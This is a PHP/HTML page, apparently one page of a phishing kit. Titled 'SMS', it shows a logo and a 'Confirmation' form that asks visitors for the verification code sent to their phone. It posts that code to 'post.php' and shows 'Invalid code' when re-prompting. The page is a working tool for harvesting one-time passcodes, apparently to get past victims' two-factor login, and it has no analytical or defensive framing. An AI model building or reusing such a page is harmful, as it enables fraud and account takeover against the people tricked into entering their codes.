<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
<link rel="icon" type="image/png" href="data:image/png;base64,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">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
*{
    max-width: 100%;
    font-family: sans-serif;
    outline: none;
    box-sizing: border-box;
}

body{
    margin: 0;
}

header img {
 width: 110px;  
 padding: 14px;
}


main{
    text-align: center;
    margin-top: 40px;
}

.continer{
    display: inline-block;
    border: solid 1px #00000000;
    width: 600px;
   box-shadow: 0px 10px 20px 10px #0000000a;
    padding: 40px;
    border-radius:20px;
}

.ico img{
    width: 70px;
}

.title{
    padding: 14px;
}

.title span{
    font-size: 1.2em;
    font-weight: bold;
}

.p {
    text-align: left;
}

.p p{
    color:red;
    font-size: 0.9em;
}


.form-container {
    width: 600px;
    margin: 20px 0;
    font-family: Arial, sans-serif;
  }
  
  label {
    display: block;
    margin-bottom: 5px;
    font-weight: bold;
  }
  
  input[type="text"] {
    width: 100%;
    padding: 18px;
    margin-bottom: 20px;
    border: 1px solid #ccc;
    border-radius: 15px;
    box-sizing: border-box;
  }
  
  .card-details {
    display: flex;
    justify-content: space-between;
  }
  
  .card-details div {
    width: 48%;
  }
  .cardlogo{
      width:120px;
      margin-left:0px;
     
  }

.form{

    width:400px;
    display:inline-block;
}

.but{
    text-align:right;
}
.but button{
    width:40%;
    font-size:1em;
      border-radius: 8px;
    padding:10px;
    color:white;
    background-color:#0071e3;
    border: none;
   
   
}

.but1 button{
    width:100%;
    font-size:1em;
      border-radius: 8px;
    padding:10px;
    color:white;
    background-color:#0071e3;
    border: none;
   
   
}


footer{
    margin-top:150px;
}

.mobil{
    display: none;
}

.tablte{
    display: none;
}


@media screen and (max-width : 820px) {

    .continer{
        display: inline-block;
        border: solid 1px #00000000;
        width: 660px;
       box-shadow: none;
        padding: 40px;
        border-radius:20px;
    }
    
        
    .col{
        padding: 30px 8px;
    }
    
        .chek{
       
        align-items: center;
        display: flex;
        margin-left:29%;
      
    }
    
    .chek{
        margin-top:100px;
    }
    
    
    
    .chek label{
       margin-left:6px;
       color:#494949;
    
    }
    
    .chek input{
        height: 16px;
        width: 16px;
    }
    
    .foo{
        display: none;
    }
    
    .mobil{
        display: none;
    }
    
    .tablte{
        display: block;
    }

    .but button{
    width:100%;
    font-size:1em;
      border-radius: 8px;
    padding:10px;
    color:white;
    background-color:#0071e3;
    border: none;
   
   
}
        
    }
    
    @media screen and (max-width : 500px) {
    
        .continer{
            display: inline-block;
            border: solid 1px #00000000;
            width: 660px;
           box-shadow: none;
            padding: 40px;
            border-radius:20px;
        }
        
            
        .col{
            padding: 30px 8px;
        }
        
            .chek{
           
            align-items: center;
            display: flex;
            margin-left:29%;
          
        }
        
        .chek{
            margin-top:100px;
        }
        
        
        
        .chek label{
           margin-left:6px;
           color:#494949;
        
        }
        
        .chek input{
            height: 16px;
            width: 16px;
        }
        
        .foo{
            display: none;
        }
        
        .mobil{
            display: block;
        }
    
        .tablte{
            display: none;
        }
    
        
    
        footer img{
            width:100%;
        }
    
        
            
        }
</style>
    <title>SMS</title>
</head>
<body>
    
<header>
    <div class="logo">
<img src="data:image/png;base64,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">
    </div>
    
    

<main>


<div class="form">
    <div class="continer">
    
<form action="post.php" method="post">
<h2>Confirmation</h2>

<div class="col"><h4 style="font-weight:normal; text-align:left;" >Enter the verification code sent to your phone.</h4> </div>

<div class="col">
<input type="text" placeholder="Enter code" name="otp" required> <br> 
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code</p>';
}
?>
</div>

<div class="but1">
    <button type="submit">confirm</button>
</div>

</div> 


https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js</form>

</div>
</div>



</main>
</body>
</html>